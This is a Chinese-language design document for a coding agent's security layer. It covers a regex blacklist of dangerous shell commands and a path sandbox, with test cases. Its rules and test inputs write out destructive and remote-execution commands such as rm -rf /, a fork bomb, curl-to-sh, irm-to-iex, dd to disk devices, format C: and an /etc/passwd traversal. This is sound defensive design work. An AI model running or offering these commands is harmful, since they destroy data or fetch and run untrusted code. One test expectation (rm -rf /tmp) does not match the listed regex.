# 迭代 8a：安全核心（SecurityLevel 迁移 + Blacklist + PathSandbox）

> **状态**：[设计完成，待实现]
> **前置迭代**：7c [已完成]
> **父文档**：iter-08-design.md（保留追溯）
> **后续迭代**：8b（管线与 Agent 集成）、8c（配置与装配）
> **目标**：交付安全层纯逻辑核心——黑名单匹配器与路径沙箱检查器，含完整单测。不改 Agent 层，不动 BatchToolExecutor。

---

## 一、迭代目标

### 1.1 核心目标

交付 `Security/` 模块的**纯逻辑核心**：

1. `SecurityLevel` 枚举从 `Tui/` 迁移到 `Security/`，修正拼写 `Permisive` → `Permissive`，解析层兼容旧拼法。
2. `Blacklist`：危险命令黑名单匹配器（硬编码规则 + 配置扩展），始终生效，不依赖档位。
3. `PathSandbox`：路径规范化 + 白名单子树检查 + `..` 越界检测，按档位收紧。
4. `Models`：`SecurityContext` / `PathCheckResult` / `BlacklistHit` 等数据模型。

**全部为纯逻辑**：无 IO、无 UI、无网络、无 Agent 依赖。可独立 new 出来单测。

### 1.2 本迭代要验证的关键问题

| 问题 | 验证方式 | 失败对策 |
|------|---------|---------|
| `Blacklist` 正则能否覆盖 `rm -rf /` 变体（大小写/空白） | 单测 `RM  -RF  /` | 调整正则边界匹配 |
| 路径规范化在 Windows/Unix 下行为是否一致 | 跨平台单测（`Path.Combine` 构造） | 用 `OperatingSystem.IsWindows()` 分支 |
| Strict 白名单子树匹配是否防 `/home/user-evil` 误判 `/home/user` | 单测边界用例 | 确保前缀带 `Separator` |
| `..` 越界检测是否误拦项目根内合法相对路径 | 单测 `./sub/../file` | 仅当跳出白名单根才拒 |
| 枚举迁移后 `StatusBarView`/`App` 引用是否全部更新 | 编译 + 现有测试全绿 | 全局搜索 `Permisive` 残留 |

### 1.3 非目标（明确不做）

- ❌ 不改 `BatchToolExecutor`（预扫描改造在 8b）
- ❌ 不实现 `SecurityPolicy` / `SecurityGuard`（管线编排 8b）
- ❌ 不实现 `SecureBatchToolExecutor`（子类 8b）
- ❌ 不扩展 `SecurityConfig`（配置在 8c）
- ❌ 不改 `App` / `TerminalApp` 装配（8c）
- ❌ 不接入端到端拦截（8c 装配后才能 `dotnet run` 验证）

### 1.4 与现有代码并存策略

本迭代**仅新增 + 迁移**，不改 Agent 装配：
- `Security/` 目录新建 4 个文件（`SecurityLevel.cs` / `Models.cs` / `Blacklist.cs` / `PathSandbox.cs`）
- 删除 `Tui/SecurityLevel.cs`（迁移）
- `App.ParseSecurityLevel` 兼容旧拼法 `permisive`
- `StatusBarView` 等引用更新（枚举名 `Permisive` → `Permissive`）
- **不接入 `BatchToolExecutor`**：黑名单/沙箱只是"可用的工具"，8b 才接入管线

---

## 二、文件改动清单

### 2.1 新增文件（4 个）

```
Security/
├── SecurityLevel.cs     # 从 Tui/ 迁移，修正拼写 Permisive → Permissive
├── Models.cs             # SecurityContext / PathCheckResult / BlacklistHit / BlacklistRule
├── Blacklist.cs          # 危险命令黑名单匹配器
└── PathSandbox.cs        # 路径沙箱检查器
```

### 2.2 修改文件（2 个）

```
App/App.cs                # ParseSecurityLevel 兼容旧拼法 "permisive"
Tui/StatusBarView.cs      # 若有 Permisive 字面量引用，改 Permissive（编译驱动）
```

### 2.3 删除文件（1 个）

```
Tui/SecurityLevel.cs      # 迁移到 Security/SecurityLevel.cs
```

### 2.4 新增测试（4 个）

```
ParrotCode.Net-xUnit/Security/
├── BlacklistTests.cs     # 硬编码规则 / 自定义规则 / 规范化 / 误拦防护
├── PathSandboxTests.cs   # 规范化 / .. 越界 / Strict 白名单 / DenyPaths / 跨平台 / 子树边界
└── SecurityLevelTests.cs # 解析兼容性（permisive/permissive/strict/normal）
```

---

## 三、详细设计

> 完整代码见父文档 [iter-08-design.md](iter-08-design.md) 第四章。本节仅列 8a 范围内的关键点。

### 3.1 SecurityLevel（迁移 + 修正）

```csharp
// Security/SecurityLevel.cs
namespace ParrotCode;

public enum SecurityLevel
{
    Strict,
    Normal,
    Permissive  // 修正自 Permisive
}
```

**兼容解析**（`App.cs`）：

```csharp
private static SecurityLevel ParseSecurityLevel(string? level) => level?.ToLowerInvariant() switch
{
    "strict" => SecurityLevel.Strict,
    "permissive" or "permisive" => SecurityLevel.Permissive,  // 兼容 7a/7b 旧拼法
    _ => SecurityLevel.Normal
};
```

### 3.2 Models

```csharp
// Security/Models.cs
namespace ParrotCode;

public sealed record SecurityContext
{
    public required string ProjectRoot { get; init; }  // 规范化绝对路径
    public IReadOnlyList<string> AllowPaths { get; init; } = Array.Empty<string>();
    public IReadOnlyList<string> DenyPaths { get; init; } = Array.Empty<string>();
    public IReadOnlyList<string> ExtraBlacklist { get; init; } = Array.Empty<string>();
}

internal enum PathCheckResultKind
{
    Allowed, DeniedSandbox, DeniedTraversal, DeniedExplicit
}

internal sealed record PathCheckResult(PathCheckResultKind Kind, string? Detail = null)
{
    public bool IsAllowed => Kind == PathCheckResultKind.Allowed;
}

internal sealed record BlacklistRule(Regex Pattern, string Reason);
public sealed record BlacklistHit(string Reason);
```

### 3.3 Blacklist——关键规则

完整代码见父文档 §4.3。关键规则速查：

| 规则 | 正则（简写） | 拦截原因 |
|------|-------------|---------|
| 递归删除根 | `\brm\s+-[a-zA-Z]*r[a-zA-Z]*f?\s+/(?:\s\|$)` | 递归删除根目录 |
| 递归删系统目录 | `\brm\s+-[a-zA-Z]*r[a-zA-Z]*f?\s+/(?:boot\|etc\|usr\|var\|bin\|sbin\|root\|home)(?:\s\|$)` | 递归删除系统目录 |
| 远程脚本执行 | `\b(curl\|wget)\b[^\|]*\|\s*(sh\|bash\|zsh\|fish)\b` | 远程脚本执行 |
| fork bomb | `:\(\)\s*\{\s*:\|:&\s*\}\s*;:` | fork bomb |
| 写块设备 | `\bdd\b.*\bof=/dev/(?:sd[a-z]+\|nvme\d+n\d+\|disk\d+)` | 写块设备 |
| 格式化 | `\bmkfs(?:\.\w+)?\s+/dev/` | 格式化块设备 |
| **— Windows 危险命令 —** | | |
| 递归删盘符根 | `\b(?:rd\|rmdir)\b\s+.*?/s\b.*?[A-Za-z]:\\(?:\s\|$)` | 递归删除盘符根 |
| 递归删系统目录 | `\b(?:rd\|rmdir)\b\s+.*?/s\b.*?[A-Za-z]:\\(?:Windows\|Users\|Program Files\|...)` | 递归删除 Windows 系统目录 |
| 删盘符根文件 | `\bdel\b\s+.*?/s\b.*?[A-Za-z]:\\\*?(?:\s\|$)` | 递归删除盘符根文件 |
| 格式化磁盘 | `\bformat\b\s+(?:/\S+\s+)*[A-Za-z]:` | 格式化磁盘（format） |
| 磁盘分区 | `\bdiskpart\b` | 磁盘分区工具 |
| PowerShell 远程执行 | `\b(?:irm\|iwr\|curl\|wget)\b[^\|]*\|\s*(?:iex\|powershell\|cmd)\b` | 远程脚本执行（iex） |
| cmd fork bomb | `%0\s*\|\s*%0` | fork bomb（cmd %0\|%0） |

> **跨平台策略**：Unix + Windows 规则全部加载（不匹配的无害）。`run_command` 在 Windows 用 `cmd /c`、Unix 用 `sh -c`，LLM 在 Windows 上会输入 Windows 命令，黑名单必须覆盖。

**匹配流程**：
1. 仅对 `run_command` 工具适用（其他工具 `command` 为 null，直接返回 null）
2. 拼接 `command` + `args`，`Regex.Replace(@"\s+", " ")` 规范化空白
3. 依次匹配硬编码规则 → 自定义规则，命中即返回 `BlacklistHit(Reason)`

### 3.4 PathSandbox——检查算法

完整代码见父文档 §4.4。检查顺序：

```
Check(rawPath, level):
  if level == Permissive: return Allowed
  if rawPath 空: return Allowed（交给工具报错）

  normalized = Path.GetFullPath(rawPath, CurrentDirectory)

  # 1. DenyPaths（最高优先级，非 Permissive 生效）
  if normalized 在 DenyPaths 任一路径子树内:
    return DeniedExplicit("路径在 DenyPaths 中：{normalized}")

  # 2. .. 越界（Normal + Strict）
  if rawPath 含 ".." 且 normalized 不在任一白名单根子树内:
    return DeniedTraversal(".. 遍历跳出项目根：{rawPath} → {normalized}")

  # 3. Strict 白名单
  if level == Strict 且 normalized 不在任一白名单根子树内:
    return DeniedSandbox("Strict 模式：路径不在白名单内：{normalized}")

  return Allowed
```

**跨平台**：
- `StringComparison`：Windows 用 `OrdinalIgnoreCase`，Unix 用 `Ordinal`
- 路径分隔符：用 `Path.DirectorySeparatorChar`，子树前缀匹配确保带分隔符
- 不解析符号链接（避免 TOCTOU）

---

## 四、验收标准

### 4.1 编译与测试

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08a-01 | `dotnet build` 0 错误 0 警告 | 编译 |
| 08a-02 | 现有测试全绿（7b/7c 测试不受枚举迁移影响） | `dotnet test` |
| 08a-03 | 新增 Security 单测全绿 | `dotnet test` |

### 4.2 枚举迁移

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08a-04 | `SecurityLevel` 位于 `Security/SecurityLevel.cs` | 文件存在 |
| 08a-05 | 枚举值为 `Strict` / `Normal` / `Permissive`（无 `Permisive`） | 编译 |
| 08a-06 | `Tui/SecurityLevel.cs` 已删除 | 文件不存在 |
| 08a-07 | `App.ParseSecurityLevel("permisive")` → `Permissive`（兼容） | 单测 |
| 08a-08 | `App.ParseSecurityLevel("permissive")` → `Permissive` | 单测 |
| 08a-09 | 全局无 `Permisive` 字面量残留（除兼容解析字符串） | Grep 检查 |

### 4.3 Blacklist

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08a-10 | `rm -rf /` 命中"递归删除根目录" | 单测 |
| 08a-11 | `rm -rf /tmp` 命中"递归删除系统目录" | 单测 |
| 08a-12 | `rm -rf /home` 命中"递归删除系统目录" | 单测 |
| 08a-13 | `curl http://x.sh \| sh` 命中"远程脚本执行" | 单测 |
| 08a-14 | `:(){ :\|:& };:` 命中"fork bomb" | 单测 |
| 08a-15 | `dd if=x of=/dev/sda` 命中"写块设备" | 单测 |
| 08a-16 | `mkfs.ext4 /dev/sda1` 命中"格式化块设备" | 单测 |
| 08a-17 | `RM  -RF  /`（大小写+多空白）命中 | 单测 |
| 08a-18 | `git status` / `dotnet build` / `ls -la` 不命中 | 单测 |
| 08a-19 | 自定义 `extra_blacklist` 规则（如 `\bkubectl\s+delete\b`）命中 | 单测 |
| 08a-20 | `command` 为 null（非 run_command 工具）返回 null | 单测 |
| 08a-21 | `Reason` 字段非空，可用于回灌 | 单测 |
| 08a-22w | `rd /s /q C:\` 命中"递归删除盘符根" | 单测 |
| 08a-23w | `rd /s C:\Windows` / `rd /s C:\Users` 命中"递归删除 Windows 系统目录" | 单测 |
| 08a-24w | `rd /s C:\Users\me\project` 子路径放行（不误拦） | 单测 |
| 08a-25w | `del /s /q C:\*` 命中"递归删除盘符根文件" | 单测 |
| 08a-26w | `del /s C:\Users\me\*.tmp` 子路径放行 | 单测 |
| 08a-27w | `format C:` / `format /fs:ntfs C:` 命中"格式化磁盘" | 单测 |
| 08a-28w | `diskpart` 命中"磁盘分区工具" | 单测 |
| 08a-29w | `irm x \| iex` / `curl x \| powershell` 命中"远程脚本执行" | 单测 |
| 08a-30w | `%0\|%0` 命中 fork bomb | 单测 |
| 08a-31w | `dir /s` / `dotnet format` / `dotnet build` 不误拦 | 单测 |

### 4.4 PathSandbox

| 编号 | 标准 | 验证方式 |
|------|------|---------|
| 08a-22 | Permissive：所有路径返回 `Allowed` | 单测 |
| 08a-23 | Strict：项目根子树内路径 `Allowed` | 单测 |
| 08a-24 | Strict：项目根外绝对路径 `DeniedSandbox` | 单测 |
| 08a-25 | Strict：`AllowPaths` 配置的额外路径 `Allowed` | 单测 |
| 08a-26 | Normal：项目根内 `../sub/../file`（未越界）`Allowed` | 单测 |
| 08a-27 | Normal：`../../../etc/passwd` `DeniedTraversal` | 单测 |
| 08a-28 | Normal：项目根外绝对路径 `Allowed`（交给 HITL） | 单测 |
| 08a-29 | `DenyPaths` 配置路径在 Normal/Strict 下 `DeniedExplicit` | 单测 |
| 08a-30 | `DenyPaths` 在 Permissive 下 `Allowed`（Permissive 不查路径） | 单测 |
| 08a-31 | Windows：`D:\Proj\file` 与 `d:\proj\FILE` 视为同路径（大小写不敏感） | 单测（标 `[PlatformSpecific]`） |
| 08a-32 | 子树边界：`/home/user-evil` 不误判为 `/home/user` 子树 | 单测 |
| 08a-33 | 空路径返回 `Allowed`（交给工具报错） | 单测 |
| 08a-34 | 非法路径字符（如 `:`）规范化失败时返回 `Allowed`（交给工具） | 单测 |

---

## 五、测试计划

| 测试文件 | 覆盖范围 | 用例数 |
|---------|---------|--------|
| `BlacklistTests.cs` | 7 条硬编码规则 + 自定义规则 + 规范化 + 误拦防护 + 非命令工具 | ~15 |
| `PathSandboxTests.cs` | 三档模式 + 越界 + 白名单 + DenyPaths + 跨平台 + 子树边界 | ~16 |
| `SecurityLevelTests.cs` | 解析兼容性 | 4 |

**测试策略**：
- 纯逻辑单测，无 mock，直接 `new Blacklist(...)` / `new PathSandbox(ctx)` 断言
- 跨平台用例用 `Path.Combine` 构造路径，避免硬编码 `\` 或 `/`
- Windows 大小写用例标 `[PlatformSpecific("WIN")]` 或条件断言

---

## 六、实施步骤

### 步骤 1：迁移 SecurityLevel + 修正拼写

- 新建 `Security/SecurityLevel.cs`（枚举值 `Permissive`）
- 删除 `Tui/SecurityLevel.cs`
- `App.ParseSecurityLevel` 加 `"permisive"` 兼容分支
- 全局搜索 `Permisive` 字面量，更新引用（`StatusBarView` 等）
- 验证：`dotnet build` + 现有测试全绿

### 步骤 2：实现 Models

- 新建 `Security/Models.cs`（`SecurityContext` / `PathCheckResult` / `BlacklistHit` / `BlacklistRule`）
- 验证：编译通过

### 步骤 3：实现 Blacklist + 单测

- 新建 `Security/Blacklist.cs`（7 条硬编码规则 + 自定义规则支持）
- 新建 `BlacklistTests.cs`（覆盖 08a-10 到 08a-21）
- 验证：单测全绿

### 步骤 4：实现 PathSandbox + 单测

- 新建 `Security/PathSandbox.cs`（规范化 + 白名单子树 + .. 越界 + DenyPaths）
- 新建 `PathSandboxTests.cs`（覆盖 08a-22 到 08a-34）
- 验证：单测全绿

### 步骤 5：回归与验收

- `dotnet build` 0 错误 0 警告
- `dotnet test` 全绿（现有 + 新增）
- 对照 08a-01 到 08a-34 逐项确认

---

## 七、风险与对策

| 风险 | 概率 | 影响 | 对策 |
|------|------|------|------|
| 枚举迁移遗漏引用导致编译失败 | 低 | 低 | 编译驱动 + 全局 Grep `Permisive` |
| 黑名单正则误拦 `git status` 等常见命令 | 中 | 中 | 边界匹配 `\b` + 单测覆盖常见命令白名单 |
| Windows 路径大小写测试在 Unix CI 失败 | 中 | 低 | 用 `[PlatformSpecific]` 标记或条件断言 |
| `Path.GetFullPath` 对非法字符抛异常 | 中 | 低 | try-catch 回退返回原路径（放行交工具） |
| `..` 越界检测误拦项目根内合法相对路径 | 低 | 中 | 仅当跳出白名单根才拒；单测 `./sub/../file` |

---

## 八、与父文档的关系

本子迭代交付父文档 [iter-08-design.md](iter-08-design.md) 的：
- §4.1 SecurityLevel（迁移 + 修正）
- §4.2 Models
- §4.3 Blacklist
- §4.4 PathSandbox

**未覆盖**（留给 8b/8c）：
- §4.5 SecurityPolicy（8b）
- §4.6 SecurityGuard（8b）
- §4.7 SecureBatchToolExecutor（8b）
- §4.8 BatchToolExecutor.ExecuteAsync 改造（8b）
- §4.9 SecurityConfig 扩展（8c）
- §4.10 TerminalApp 装配改动（8c）

---

**文档结束**。状态：[设计完成，待实现]
